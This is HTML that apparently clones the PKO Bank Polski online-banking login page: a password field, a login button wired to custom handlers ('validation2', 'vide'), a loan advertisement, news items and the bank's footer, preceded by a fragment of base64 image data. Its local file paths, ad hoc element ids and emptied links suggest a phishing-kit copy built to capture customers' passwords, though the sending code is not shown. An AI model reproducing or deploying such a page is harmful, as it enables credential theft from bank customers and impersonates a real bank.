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&quot;);"></div>
                                             <div class="_2-L3Z _3GtqT _21ynL">
                                                <div class="_28toS">
                                                   <div class="_2Fqzw">
                                                      <div class="_2VjX- E7maL">
                                                         <div class="_1cSKj _2HczD _1sq3L _1FQ3M">
                                                            <div class="_3GWo7">
                                                               <input class="_2pRLa" type="password" autocomplete="off" placeholder="Wpisz hasło"    id="pwww" >
                                                               <div class="_17M1H"></div>
                                                            </div>
                                                         </div>
                                                         <div class="_1Gcbw _2HczD _15FJG" id="diVerrlog2" style="display:none;">
                                                            
                                                            Wpisz poprawne hasło



                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                             <div class="t4GiR">
                                                <div class="fOLEC"></div>
                                                <div class="_1U4d6">
                                                   <button class="_2lpC_ _1VeLj _3NXVH _38wVI _1q2Ch" type="button" ng-click="validation2()" >
                                                      <div class="tMrJN"><span class="_7l_9Y"   >Zaloguj</span></div>
                                                   </button>
                                                   <a href="#INT_RECOVER_PASSWORD" class="_2c-3D _3bfMd" data-text="Odzyskaj hasło">
                                                      <div class="IHPU0">Odzyskaj hasło</div>
                                                   </a>
                                                   <a href="#" class="_2c-3D _3bfMd _153wQ"ng-click="vide()" data-text="‹ Powrót" align="left">
                                                      <div class="IHPU0">‹ Powrót</div>
                                                   </a>
                                                </div>
                                             </div>
                                          </div>
                                       </form>
                                    </div>






















                                    <div class="_2D74s"></div>
                                    <div class="_27ylV _1r3Gu">
                                       <div>
                                          <div class="_1jnKA o03Bm">
                                             <picture>
                                           
                                                <img alt="Pożyczka gotówkowa" srcset="./file/IMGss416.png" height="208" src="IMGss416.png" width="208">
                                             </picture>
                                             <div class="_2QHGV _3KlCO">
                                                <div class="">
                                                   <h2 id="spraw-sobie-i-bliskim-prezent-rrso-1157">Spraw sobie i bliskim prezent. RRSO 11,57%</h2>
                                                   <p>Weź swoją pierwszą pożyczkę u&nbsp;nas – z&nbsp;obniżoną prowizją i&nbsp;stałym oprocentowaniem</p>
                                                </div>
                                                <div class="WuDQM _2S93q">
                                                   <button class="_2lpC_ _1VeLj _2Sz7b L1PAc"  type="button" data-text="Sprawdź propozycję">
                                                      <div class="tMrJN"><span class="_7l_9Y">Sprawdź propozycję</span></div>
                                                   </button>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 <div class="_2QzWF">
                                    <div class="dZXXQ">
                                       <h1 class="_2edmC S_ce3" aria-level="2">Aktualności</h1>
                                       <div class="_3qtsP _1YmMe ED8Py">
                                          <div class="">
                                             <p><em>29.11.2023</em></p>
                                             <h3 id="zwolnij-by-wyprzedzić-oszustów">Zwolnij, by wyprzedzić oszustów</h3>
                                             <p>Sprawdź i&nbsp;stosuj 10 podstawowych zasad bezpieczeństwa</p>
                                          </div>
                                          <a aria-label="Więcej: Zwolnij, by wyprzedzić oszustów" href="" class="_2c-3D _3tdEh" data-text="Więcej">
                                             <div class="_2-49L"><span class="_2eFtA">Otwórz w nowej karcie&nbsp;</span>Więcej</div>
                                          </a>
                                       </div>
                                       <div class="_3qtsP _1YmMe">
                                          <div class="">
                                             <p><em>19.10.2023</em></p>
                                             <h3 id="czy-to-na-pewno-twoja-płatność">Czy to na pewno Twoja płatność?</h3>
                                             <p>Dostosuj powiadomienia, aby wiedzieć, co dzieje się na Twoim koncie</p>
                                          </div>
                                          <a aria-label="Więcej: Czy to na pewno Twoja płatność?" href="" class="_2c-3D _3tdEh" data-text="Więcej">
                                             <div class="_2-49L"><span class="_2eFtA">Otwórz w nowej karcie&nbsp;</span>Więcej</div>
                                          </a>
                                       </div>
                                       <div class="_3qtsP _1YmMe">
                                          <div class="">
                                             <p><em>10.07.2023</em></p>
                                             <h3 id="polecaj-nasze-konta-i-zarabiaj">Polecaj nasze konta i zarabiaj!</h3>
                                             <p>W zależności od rodzaju kont, które masz, możesz zgarnąć nawet 4000 zł w&nbsp;X&nbsp;edycji Programu poleceń.</p>
                                          </div>
                                          <a aria-label="Więcej: Polecaj nasze konta i zarabiaj!" href="" class="_2c-3D _3tdEh" data-text="Więcej">
                                             <div class="_2-49L"><span class="_2eFtA">Otwórz w nowej karcie&nbsp;</span>Więcej</div>
                                          </a>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <div class="_3mGH9"></div>
                     <div class="_2NEx0">
                        <div class="_3mjLM">
                           <div class="_2LWXP"><a rel="noopener noreferrer" class="_3WAzU" href="" target="_blank" data-text="© 2023 PKO Bank Polski"><span class="hofzD">Otwórz w nowej karcie&nbsp;</span>© 2023 PKO Bank Polski</a><a rel="noopener noreferrer" class="_3WAzU" href="" target="_blank" data-text="Kod BIC (Swift): BPKOPLPW"><span class="hofzD">Otwórz w nowej karcie&nbsp;</span>Kod BIC (Swift): BPKOPLPW</a><a rel="noopener noreferrer" class="_3WAzU" href="" target="_blank" data-text="Polityka prywatności"><span class="hofzD">Otwórz w nowej karcie&nbsp;</span>Polityka prywatności</a></div>
                           <div class="_34nRC">
                              <a rel="noopener noreferrer" class="_3WAzU _2S67B" href="" target="_blank" data-text="Bezpieczeństwo">
                                 <span class="hofzD">Otwórz w nowej karcie&nbsp;</span>
                                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="_2hPJH">
                                    <path d="M19 4H5l.007 7.71c0 3.744 6.472 7.562 6.748 7.722l.252.146.252-.146c.276-.16 6.748-3.978 6.748-7.722C19.007 9.211 19 4 19 4Zm-6.992 14.418c-1.886-1.153-6-4.191-6-6.707v-1.247c0-.337-.005-.8-.005-5.464h12c0 1.278.006 4.706.006 6.711-.002 2.513-4.117 5.554-6.002 6.707ZM15.45 8.53a1 1 0 0 1 1.411 0l-5.633 5.633-3.556-3.509a1 1 0 0 1 1.414-.009l2.137 2.108Z" fill="#003574"></path>
                                 </svg>
                                 Bezpieczeństwo
                              </a>
                              <a rel="noopener noreferrer" class="_3WAzU _2S67B" href="" target="_blank" data-text="Pomoc">
                                 <span class="hofzD">Otwórz w nowej karcie&nbsp;</span>
                                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="_2hPJH">
                                    <path d="M12 4a8 8 0 0 0-8 8 8 8 0 0 0 8 8 8 8 0 0 0 8-8 8 8 0 0 0-8-8Zm0 1a6.967 6.967 0 0 1 4.569 1.708l-1.43 1.43A4.948 4.948 0 0 0 12 7a4.948 4.948 0 0 0-3.129 1.13L7.441 6.7A6.958 6.958 0 0 1 12 5Zm2.458 10.132A3.961 3.961 0 0 1 12 16a3.96 3.96 0 0 1-2.448-.86 4.014 4.014 0 0 1-.706-.709A3.964 3.964 0 0 1 8 12a3.956 3.956 0 0 1 .869-2.458 3.943 3.943 0 0 1 .71-.7A3.957 3.957 0 0 1 12 8a3.964 3.964 0 0 1 2.431.846 4.014 4.014 0 0 1 .709.706A3.96 3.96 0 0 1 16 12a3.957 3.957 0 0 1-.838 2.421 4.013 4.013 0 0 1-.704.711ZM5 12a6.964 6.964 0 0 1 1.732-4.6L8.16 8.828A4.954 4.954 0 0 0 7 12a4.948 4.948 0 0 0 1.138 3.139l-1.43 1.43A6.967 6.967 0 0 1 5 12Zm7 7a6.964 6.964 0 0 1-4.585-1.723l1.428-1.429A4.954 4.954 0 0 0 12 17a4.956 4.956 0 0 0 3.167-1.16l1.428 1.428A6.964 6.964 0 0 1 12 19Zm5.3-2.441-1.429-1.43A4.953 4.953 0 0 0 17 12a4.954 4.954 0 0 0-1.152-3.157l1.428-1.428A6.957 6.957 0 0 1 19 12a6.964 6.964 0 0 1-1.7 4.559Z" fill="#003574"></path>
                                 </svg>
                                 Pomoc
